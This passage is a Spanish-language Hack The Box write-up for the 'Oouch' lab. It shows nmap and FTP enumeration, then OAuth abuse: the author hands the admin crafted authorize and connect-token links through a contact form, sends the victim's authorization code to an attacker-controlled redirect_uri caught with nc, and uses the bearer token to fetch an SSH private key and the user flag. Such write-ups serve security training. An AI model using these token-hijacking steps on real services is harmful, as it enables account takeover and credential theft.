@@ -1,0 +1,1034 @@
+---
+layout: post
+title: Oouch
+date: 2023-03-15
+description:
+img:
+fig-caption:
+tags: [eWPT, eWPTXv2, eCPPTv2, OSWE]
+---
+___
+
+<center><img src="/writeups/assets/img/Oouch-htb/Oouch.png" alt="" style="height: 394px; width:520px;"></center>
+
+***
+
+# Conocimientos
+
+* Enumeración de FTP
+
+* Abuso de OAuth Endpoint
+
+* Manipulación de parámetros
+
+* Creación de Aplicación en Django
+
+* Abuso de Authorization Workflow
+
+* Token hijacking
+
+* Abuso de Bearer Tokens
+
+* Information Disclosure
+
+* HostDiscovery
+
+* Pivoting
+
+* Abuso de Uwsgi - Pivot a www-data
+
+* Abuso de Dbus (Escalada de Privilegios)
+
+***
+
+# Reconocimiento
+
+## Escaneo de puertos con nmap
+
+### Descubrimiento de puertos abiertos
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.177 -oG openports
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-15 16:34 GMT
+Nmap scan report for 10.10.10.177
+Host is up (0.094s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+5000/tcp open  upnp
+8000/tcp open  http-alt
+
+Nmap done: 1 IP address (1 host up) scanned in 13.38 seconds
+```
+
+### Escaneo de versión y servicios de cada puerto
+
+```null
+nmap -sCV -p21,22,5000,8000 10.10.10.177 -oN portscan
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-15 16:36 GMT
+WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
+Nmap scan report for 10.10.10.177
+Host is up (0.066s latency).
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.0.8 or later
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.16.11
+|      Logged in as ftp
+|      TYPE: ASCII
+|      Session bandwidth limit in byte/s is 30000
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 ftp      ftp            49 Feb 11  2020 project.txt
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 8d6ba72b7a219f21113711ed504fc61e (RSA)
+|_  256 d2af555c060b60db9c7847b5caf4f104 (ED25519)
+5000/tcp open  http    nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+| http-title: Welcome to Oouch
+|_Requested resource was http://10.10.10.177:5000/login?next=%2F
+8000/tcp open  rtsp
+|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
+|_http-title: Site doesn't have a title (text/html).
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest, HTTPOptions: 
+|     HTTP/1.0 400 Bad Request
+|     Content-Type: text/html
+|     Vary: Authorization
+|     <h1>Bad Request (400)</h1>
+|   RTSPRequest: 
+|     RTSP/1.0 400 Bad Request
+|     Content-Type: text/html
+|     Vary: Authorization
+|     <h1>Bad Request (400)</h1>
+|   SIPOptions: 
+|     SIP/2.0 400 Bad Request
+|     Content-Type: text/html
+|     Vary: Authorization
+|_    <h1>Bad Request (400)</h1>
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8000-TCP:V=7.93%I=7%D=3/15%Time=6411F406%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
+SF:t/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</
+SF:h1>")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCon
+SF:tent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Req
+SF:uest\x20\(400\)</h1>")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x20Req
+SF:uest\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1
+SF:>Bad\x20Request\x20\(400\)</h1>")%r(RTSPRequest,64,"RTSP/1\.0\x20400\x2
+SF:0Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization
+SF:\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>")%r(SIPOptions,63,"SIP/2\.0\
+SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Auth
+SF:orization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.65 seconds
+```
+
+## Puerto 21 (FTP)
+
+Puedo conectarme como el usuario anonymous y dentro hay una nota
+
+```null
+ftp 10.10.10.177
+Connected to 10.10.10.177.
+220 qtc's development server
+Name (10.10.10.177:rubbx): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+229 Entering Extended Passive Mode (|||49454|)
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            49 Feb 11  2020 project.txt
+226 Directory send OK.
+ftp> get project.txt
+local: project.txt remote: project.txt
+229 Entering Extended Passive Mode (|||42284|)
+150 Opening BINARY mode data connection for project.txt (49 bytes).
+100% |********************************************************************************************************************************************************************|    49        0.57 KiB/s    00:00 ETA
+226 Transfer complete.
+49 bytes received in 00:00 (0.23 KiB/s)
+```
+
+```null
+cat project.txt
+Flask -> Consumer
+Django -> Authorization Server
+```
+
+## Puerto 5000 (HTTP)
+
+Con whatweb, analizo las tecnologías que emplea el servidor web
+
+```null
+whatweb http://10.10.10.177:5000
+http://10.10.10.177:5000 [302 Found] Cookies[session], Country[RESERVED][ZZ], HTTPServer[nginx/1.14.2], HttpOnly[session], IP[10.10.10.177], RedirectLocation[http://10.10.10.177:5000/login?next=%2F], Title[Redirecting...], probably Werkzeug, nginx[1.14.2]
+http://10.10.10.177:5000/login?next=%2F [200 OK] Bootstrap, Cookies[session], Country[RESERVED][ZZ], HTTPServer[nginx/1.14.2], HttpOnly[session], IP[10.10.10.177], PasswordField[password], Title[Welcome to Oouch], nginx[1.14.2]
+```
+
+La página principal se ve así:
+
+<img src="/writeups/assets/img/Oouch-htb/1.png" alt="">
+
+Me puedo registrar
+
+<img src="/writeups/assets/img/Oouch-htb/2.png" alt="">
+
+Accedo a una nueva interfaz
+
+<img src="/writeups/assets/img/Oouch-htb/3.png" alt="">
+
+Pruebo un XSS en la sección de contacto
+
+<img src="/writeups/assets/img/Oouch-htb/4.png" alt="">
+
+Pero me sale una advertencia
+
+<img src="/writeups/assets/img/Oouch-htb/5.png" alt="">
+
+Me bloquea la IP durante un minuto. Así que en vez de probar una inyección, envío simplemente una URL
+
+<img src="/writeups/assets/img/Oouch-htb/6.png" alt="">
+
+Recibo una petición
+
+```null
+nc -nlvp 80
+listening on [any] 80 ...
+connect to [10.10.16.11] from (UNKNOWN) [10.10.10.177] 55512
+GET / HTTP/1.1
+Host: 10.10.16.11
+User-Agent: python-requests/2.21.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+```
+
+Aplico fuzzing para descubrir rutas
+
+```null
+gobuster dir -u http://10.10.10.177:5000/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 100 -H "Cookie: session=.eJwlj8FqxDAMRH_F-LwUybYcO1_Re1kWS5Y3oemmxNnTsv9eQ09CzGjm6WVvbSt90W7nr5c15xj2R3svd7UX-7lp6Wq2_W7Whzl3U0SGaM5l7eZ3eD7s9X29jJBD-2Ln83jq2NZqZzs5ib76LIziNURkhCkTVayttckTt0ZSAoCAU4o5c_BYpzIFX8lXjaIZBJU9J-LkMrC4rJCIcqTkim8I4JNA4KYE6CNmjgA5jFgc-NKPdjv3b30MHgjBcUZRQIyFPBPFlqWwqqRRqM5BCgzj7tn1-H_C2fcffpRVDA.ZBIGGA.avTIcR0xF5Hc47A71YByDh3fUhI" --no-error
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.177:5000/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/03/15 18:05:46 Starting gobuster in directory enumeration mode
+===============================================================
+/about                (Status: 200) [Size: 2219]
+/contact              (Status: 200) [Size: 2909]
+/documents            (Status: 200) [Size: 2101]
+/home                 (Status: 200) [Size: 2167]
+/login                (Status: 302) [Size: 217] [--> http://10.10.10.177:5000/home]
+/logout               (Status: 302) [Size: 219] [--> http://10.10.10.177:5000/login]
+/oauth                (Status: 200) [Size: 2511]
+/profile              (Status: 200) [Size: 2975]
+/register             (Status: 302) [Size: 217] [--> http://10.10.10.177:5000/home]
+Progress: 4713 / 4714 (99.98%)
+===============================================================
+2023/03/15 18:05:51 Finished
+===============================================================
+```
+
+La ruta ```/oauth``` no la conocía
+
+<img src="/writeups/assets/img/Oouch-htb/7.png" alt="">
+
+Añado ```consumer.oouch.htb``` al ```/etc/hosts```
+
+Al clickar en el enlace y volver a iniciar sesión, se puede ver otro subdominio, ```http://authorization.oouch.htb/```, que añado también al ```/etc/hosts```. Llego a otro panel
+
+<img src="/writeups/assets/img/Oouch-htb/8.png" alt="">
+
+Pero no son válidas mis credenciales, así que me registro de nuevo
+
+<img src="/writeups/assets/img/Oouch-htb/9.png" alt="">
+
+Una vez loggeado, me ofrecen varias rutas
+
+<img src="/writeups/assets/img/Oouch-htb/10.png" alt="">
+
+Le cambio el método al segundo para que la data se tramite por POST, pero aun así devuelve que falta un parámetro
+
+<img src="/writeups/assets/img/Oouch-htb/11.png" alt="">
+
+En la documentación de [Oauth](https://auth0.com/docs/get-started/applications/application-grant-types) encontré cual es la solución. Añado la cabecera ```grant_type=authorization_code```
+
+Pero sigo teniendo un error
+
+```null
+{"error": "invalid_request", "error_description": "Missing code parameter."}
+```
+
+Le agrego el parámetro ```code```
+
+```null
+grant_type=authorization_code&code=1234567890
+```
+
+Y recibo un error con respecto al cliente
+
+```null
+{"error": "invalid_client"}
+```
+
+En este [artículo](https://salesforce.stackexchange.com/questions/129947/oauth2-jwt-bearer-token-flow-error-invalid-client-error-description) encuentro la solución
+
+A la otra petición le añado el ```client_id``` también. En el error se pueden ver los parámetros que me faltan
+
+<img src="/writeups/assets/img/Oouch-htb/12.png" alt="">
+
+A pesar de ello, si los campos no son válidos devuelve otro error
+
+```null
+client_id=123456&redirect_uri=123123&scope=12345&response_type=123123
+```
+
+```null
+<h1>Server Error (500)</h1>
+```
+
+Me dirijo a la url ```http://consumer.oouch.htb:5000/oauth/login```, que ya puedo entrar porque estoy autenticado
+
+Al interceptar la petición con ```BurpSuite``` puedo ver todos los campos leakeados
+
+```null
+POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read HTTP/1.1
+Host: authorization.oouch.htb:8000
+Content-Length: 266
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://authorization.oouch.htb:8000
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: sessionid=rs8nymoyj4lc8pgiahbywkj4wfoiq4vq; csrftoken=VQQEiySErvnMzEOT5XdjFFSDyIxrWI6fxd4vK2Qej0gLF9gROHKwjp8YmXVM6Qr6
+Connection: close
+
+
+csrfmiddlewaretoken=hAuOKqiybvtu386DEC0xwCKrdxlQyHFNHLkztIpkzI4RQozqFR4ftv4u0hRee75V&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=&response_type=code&allow=Authorize
+```
+
+Al seguir el flujo de peticiones, puedo ver el código
+
+```null
+GET /oauth/connect/token?code=uh3JTm4bTCgCRQzt8z4ECGWfIMXZS6 HTTP/1.1
+Host: consumer.oouch.htb:5000
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://authorization.oouch.htb:8000/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: session=.eJwlj0tuwzAMRK8iaB0UpKiP5VN0XwSBSFGxUTcuLGcV5O4V0BVBzHDm8WVvbSt90W7nr5c15xj2R3svd7UX-7lp6Wq2_W7Whzl3U0SGaM5l7eZ3eD7s9X29jJBD-2Ln83jq2NZqZ5ucRKqUhVFIfURGSDmEirW1lihwa0GKBxBwGmLO7AlrKslTDVQ1imYQVCaeAk8uA4vLClMIOYbJFWoIQJOA56YBkCJmjgDZj1gc-NKPdjv3b30MnkqKEREcMCdoqTgJvraCMqo9p-YiTeDruHt2Pf6fcPb9B31ZVOE.ZBILDQ.ecSqfoQiLYaE8mpSG3VFHou852A
+Connection: close
+```
+
+Entonces lo que hace el ```oauth```, es agregar la cuenta que se creo desde el subdomio ```authorization.oouch.htb``` a las cuentas conectadas que vi al principio
+
+<img src="/writeups/assets/img/Oouch-htb/13.png" alt="">
+
+En las peticiones anteriores había visto el parámetro ```state```, que no se estaba igualando a nada. En este [artículo](https://stackoverflow.com/questions/26132066/what-is-the-purpose-of-the-state-parameter-in-oauth-authorization-request) está detallado en que consiste. A resumidas cuentas, corresponde a un token único y de un solo uso que previene SSRFs y CSRFs. Como no está igualado a nada, es probable que no sea del todo necesario arrastrarlo
+
+El vector de ataque consiste en conectar la cuenta del ```oauth``` al principal. En la sección del contacto, el usuario Administrador abre cualquier enlace que le envíe. Como se está tramitando por GET esa validación, quiere decir que los parámetros van en la URL, por lo que si le paso el código que corresponde al identificador de mi cuenta, en la sección de cuentas conectadas va a estar él
+
+El enlace a pasarle sería el siguiente:
+
+```null
+http://consumer.oouch.htb:5000/oauth/connect/token?code=q5mis3G8jVDgy2307JctXEXEjye3Bd
+```
+
+Se produce un cambio en el perfil
+
+<img src="/writeups/assets/img/Oouch-htb/14.png" alt="">
+
+Me relooggeo a través del ```/oauth/login``` y aparezco como el usuario ```qtc```
+
+Este usuario tiene archivos en la sección de documentos
+
+<img src="/writeups/assets/img/Oouch-htb/16.png" alt="">
+
+Consigo credenciales, ```develop:supermegasecureklarabubu123!```
+
+No tengo acceso a la API de primeras
+
+```null
+curl -s -X GET http://authorization.oouch.htb:8000/api/get_user -I
+HTTP/1.1 403 Forbidden
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+Vary: Authorization
+```
+
+Aplico fuzzing para descubrir directorios sobre ```get_```, suponiendo que es un convenio
+
+```null
+wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 'http://authorization.oouch.htb:8000/api/get_FUZZ'
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://authorization.oouch.htb:8000/api/get_FUZZ
+Total requests: 220546
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
+=====================================================================
+
+000000111:   403        0 L      0 W        0 Ch        "user"                                                                                                                                          
+000000188:   403        0 L      0 W        0 Ch        "users"                                                                                                                                         
+000001393:   403        0 L      0 W        0 Ch        "ssh" 
+...
+```
+
+Y también sobre ```/oauth```
+
+```null
+wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 'http://authorization.oouch.htb:8000/oauth/FUZZ'
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://authorization.oouch.htb:8000/oauth/FUZZ
+Total requests: 220546
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
+=====================================================================
+
+000000672:   301        0 L      0 W        0 Ch        "applications" 
+```
+
+Para entrar a este sitio necesito autenticarme
+
+<img src="/writeups/assets/img/Oouch-htb/17.png" alt="">
+
+Las que tengo no son válidas. En el archivo ```proyect.txt``` hablaban sobre ```Django```. Por lo que existe un ```/register``` y desde aquí si que puedo
+
+<img src="/writeups/assets/img/Oouch-htb/18.png" alt="">
+ 
+Registro una nueva aplicación y pongo como url_uris mi IP. Me quedo con los nuevos tokens que me genera
+
+<img src="/writeups/assets/img/Oouch-htb/19.png" alt="">
+
+Modifico en la petición de autorización desde el ```BurpSuite``` el ```client_id``` por este nuevo que se genera
+
+```null
+POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&scope=read HTTP/1.1
+Host: authorization.oouch.htb:8000
+Content-Length: 220
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://authorization.oouch.htb:8000
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&scope=read
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: sessionid=pzyx1f7hfpegzlsczla1409jdncysk5r; csrftoken=YGPwXvJgEqijWS6hLW7jFk3h1Ti2GmocRyNMxAliJ8xv9cidHmrkv70yFgMrjtfs
+Connection: close
+
+csrfmiddlewaretoken=uv7KOMUr7sYPHEYYH1wnvskegadqqwSqAZwv42vMcuQJWDF0Z5vhEMXaCPejUKQx&redirect_uri=http://10.10.16.11&scope=read&client_id=INx5b4x339yhWPaWOk8hSHH4mcZtbch8at3AmCgK&state=&response_type=code&allow=Authorize
+```
+
+Me devuelve un código de estado ```302```
+
+```null
+HTTP/1.1 302 Found
+Content-Type: text/html; charset=utf-8
+Location: http://10.10.16.11?code=nkxOuTp1bzvfvU4sp6t3lBCjuMQkLJ
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+Vary: Authorization, Cookie
+```
+
+Al continuar con el ```Follow Redirection```, recibo una petición por GET a mi equipo
+
+```null
+nc -nlvp 80
+listening on [any] 80 ...
+connect to [10.10.16.11] from (UNKNOWN) [10.10.16.11] 43990
+GET /?code=nkxOuTp1bzvfvU4sp6t3lBCjuMQkLJ HTTP/1.1
+Host: 10.10.16.11
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://authorization.oouch.htb:8000/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+```
+
+Ahora ya puedo obtener el token proporcionando el código y el ```client_id```
+
+```null
+POST /oauth/token/ HTTP/1.1
+Host: authorization.oouch.htb:8000
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://authorization.oouch.htb:8000/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: sessionid=pzyx1f7hfpegzlsczla1409jdncysk5r; csrftoken=YGPwXvJgEqijWS6hLW7jFk3h1Ti2GmocRyNMxAliJ8xv9cidHmrkv70yFgMrjtfs
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 116
+
+grant_type=authorization_code&code=OHavLBSLTWW3VsiLlLDV2SLyeVmIUg&client_id=szk1rObkvwnRhAVLd4R4d9pGThd4Cias9jqlc31T
+```
+
+```null
+HTTP/1.1 200 OK
+Content-Type: application/json
+Cache-Control: no-store
+Pragma: no-cache
+X-Frame-Options: SAMEORIGIN
+Content-Length: 161
+Vary: Authorization
+
+{"access_token": "jlJkyHZE55ld0jyC6612zvbU5NyUTE", "expires_in": 600, "token_type": "Bearer", "scope": "read", "refresh_token": "suVoW9ZlcPqUQNAw8aVRwVjBLw2UFM"}
+```
+
+Me puedo conectar a la API
+
+```null
+curl -s -X GET "http://authorization.oouch.htb:8000/api/get_user" -H "Authorization: Bearer jlJkyHZE55ld0jyC6612zvbU5NyUTE" | jq
+{
+  "username": "rubbx",
+  "firstname": "",
+  "lastname": "",
+  "email": "rubbx@rubbx.com"
+}
+```
+
+Para intentar obtener el código del usuario ```qtc``` se puede intentar que me tramite una petición por GET a través de la sección de contacto, aprovechando que lo puedo recibir gracias a que el ```redirect_uri``` apunta a mi equipo
+
+```null
+http://authorization.oouch.htb:8000/oauth/authorize/?redirect_uri=http://10.10.16.11&scope=read&client_id=szk1rObkvwnRhAVLd4R4d9pGThd4Cias9jqlc31T&state=&response_type=code&allow=Authorize
+```
+
+```null
+nc -nlvp 80
+listening on [any] 80 ...
+connect to [10.10.16.11] from (UNKNOWN) [10.10.10.177] 56480
+GET /?code=efTAbgeNIcvydgvNaAEso0W836EcdH HTTP/1.1
+Host: 10.10.16.11
+User-Agent: python-requests/2.21.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Cookie: sessionid=26r1v9l4tikrm3j6tnoo8ecehr7v7zmt;
+```
+
+Obtengo su token y la clave ssh
+
+```null
+curl -s -X GET "http://authorization.oouch.htb:8000/api/get_ssh" -H "Authorization: Bearer 0zpfYIxdxPlW9e2ffyF1UctBxuyJsB" | jq
+{
+  "ssh_server": "consumer.oouch.htb",
+  "ssh_user": "qtc",
+  "ssh_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----"
+}
+```
+
+Gano acceso al sistema y puedo ver la primera flag
+
+```null
+ssh -i id_rsa qtc@10.10.10.177
+The authenticity of host '10.10.10.177 (10.10.10.177)' can't be established.
+ED25519 key fingerprint is SHA256:6/ZyfRrDDz0w1+EniBrf/0LXg5sF4o5jYNEjjU32y8s.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.177' (ED25519) to the list of known hosts.
+Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Feb 25 12:45:55 2020 from 10.10.14.3
+qtc@oouch:~$ cat user.txt
+9a4d0b114dd7670da178f8747cf57c6b
+```
+
+# Escalada (No intencionada)
+
+Se puede abusar del ```pkexec``` ya que es SUID
+
+```null
